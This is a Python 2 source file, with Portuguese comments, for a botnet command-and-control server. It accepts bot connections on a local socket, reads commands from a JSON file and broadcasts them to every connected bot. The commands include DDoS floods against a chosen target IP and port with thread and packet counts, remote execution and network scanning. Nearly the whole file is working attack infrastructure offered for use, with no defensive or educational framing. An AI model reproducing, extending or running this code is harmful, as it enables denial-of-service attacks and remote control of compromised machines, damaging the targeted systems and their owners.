#!/usr/bin/env python2.7
# coding=utf-8

import socket
import os, sys
import time, base64

import hashlib
import requests
#import MySQLdb para teste
import thread
import json

def Read_BConfig_File():

  attempts = 0

  while(attempts < 10): 
    try:
      config_file = open('bot_ccommands', 'r')
      
      config_dict = json.loads(config_file.read())

      config_file.close()

      return config_dict
      break

    except Exception as read_bconfig_error:
      attempts += 1
  

def Clear_BConfig_File():

  base_configfile = {
    'target_ip': 'Null',
    'target_port': 'Null',
    'threads': 'Null',
    'packages': 'Null',
    'command': 'Null'
  }

  base_configjson = json.dumps(base_configfile)

  config_file = open('bot_ccommands', 'w')

  config_file.write(base_configjson)

  config_file.close()


def Decode_BConfig_File():

  valid_commands = {
                    'Command_Bot.Dexec' : True,
                    'Command_Bot.Netscan' : True
                    }
  
  config_file = Read_BConfig_File()

  if(config_file['command'] == 'Null'):
    return True

  elif(config_file['command'] == 'Command_Bot.ddos'):
    string_command = str('Command_Bot.ddos{"%s", %i, 1, %i}' %(config_file['target_ip'], config_file['target_port'], config_file['packages']))

    Send_Command(string_command)
    
    Clear_BConfig_File()

    return False

  elif(config_file['command'] == 'Command_Bot.Addos'):
    string_command = str('Command_Bot.Addos{"%s", %i, %i, %i}' %(config_file['target_ip'], config_file['target_port'], config_file['threads'], config_file['packages']))

    Send_Command(string_command)

    Clear_BConfig_File()
    
    return False

  elif(valid_commands[config_file['command'].split('{')[0]]):# se o commando estiver nessa lista tudo bem senao esquece!!
    Send_Command(config_file['command'])

    Clear_BConfig_File()

    return False


def Comand_Base_Connection(host, port):# ate aqui perfeita 

  so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  so.bind((host, port))
  so.listen(200)

  def Comand_Taccept():
    while(True):
      conn, addr = so.accept()
      
      if(conn != ''):
        clients.append(conn)
      
      else:
        pass
  
  thread.start_new_thread(Comand_Taccept, ())

    
def Send_Command(command): #arrumar essa funcao ta feia e nao totalmente funcional

  booll = True

  while(booll):
    
    if(len(clients) > 0):

      for bot in clients:

        try:
          bot.send(str(command).encode('ascii'))
          booll = False

        except Exception as sc_error:
          pass

    else:
      pass


def main():

  global clients
  clients = []

  host_ip = str('192.168.0.3')
  host_port = int(9878)

  get_loop = bool(True)

  Comand_Base_Connection(host_ip, host_port)

#  while(get_loop):

#    get_loop = Decode_BConfig_File()
  while(get_loop):

    try:
      Decode_BConfig_File()
    
    except:
      pass
  
  



if __name__ == '__main__':

# importante tambem lembrar para reutilizar o address no socket pra toda hr nao ter que esperar pra krl !!!
  main()



'''
codes de teste:
  
  {while True:
    if len(clients) > 0:
      for i in clients:
        try:
          data = i.recv(1024)
          print data
        except:
          pass
        
    else:
      pass}

{Send_Command('Ola tudo bem com vc ?\n')}
'''